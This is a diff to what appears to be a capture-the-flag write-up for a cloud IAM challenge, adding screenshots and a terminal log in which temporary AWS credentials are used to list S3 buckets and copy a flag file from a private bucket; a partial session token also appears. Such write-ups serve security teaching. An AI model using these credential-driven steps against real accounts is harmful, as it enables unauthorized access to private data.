@@ -16,8 +16,9 @@ View page source:
 
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/07a4a39f-1222-45f4-bcb5-d35019731a58)
 
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/c59e9be8-2271-4e3b-91fc-e1a2d3100529)
 
-
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/b6957837-0ef0-47f2-940e-a6710d0b930c)
 
 ```
 {
@@ -107,7 +108,21 @@ AWS_SESSION_TOKEN=FwoGZXIvYXdzEBMaDGVS984p7hEEBjUWuCKiAgPfKvN/lHfWpkrx0GDo5XtKPK
 
 
 ```
-
+┌─[✗]─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws s3 ls --profile challenge6
+2024-06-02 18:19:19 challenge-website-storage-215f327
+2023-06-04 22:37:29 tbic-wiz-analytics-bucket-b44867f
+2023-06-05 18:37:44 thebigiamchallenge-admin-storage-abf1321
+2023-06-04 22:01:02 thebigiamchallenge-storage-9979f4b
+2023-06-05 18:58:31 wiz-privatefiles
+2023-06-05 18:58:31 wiz-privatefiles-x1000
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws s3 ls s3://wiz-privatefiles-x1000 --profile challenge6
+2023-06-06 01:12:27       4220 cognito2.png
+2023-06-05 18:58:35         40 flag2.txt
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt - --profile challenge6
+{wiz:open-sesame-or-shell-i-say-openid}
 ```
 
 
